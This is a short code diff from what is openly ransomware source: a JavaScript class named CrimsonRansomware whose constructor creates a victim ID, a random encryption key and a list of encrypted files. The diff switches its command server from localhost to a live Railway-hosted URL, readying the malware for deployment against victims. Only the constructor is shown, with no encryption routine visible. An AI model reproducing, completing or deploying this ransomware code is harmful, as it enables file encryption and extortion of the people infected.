@@ -8,7 +8,7 @@ const axios = require('axios');
 class CrimsonRansomware {
     constructor() {
         // ⚠️ UPDATE THIS TO YOUR RAILWAY URL AFTER DEPLOY ⚠️
-        this.serverUrl = 'http://localhost:3001'; // <- CHANGE THIS!
+        this.serverUrl = 'https://crimson-production-d9ad.up.railway.app';
         this.victimId = crypto.randomBytes(8).toString('hex');
         this.encryptedFiles = [];
         this.encryptionKey = crypto.randomBytes(32);
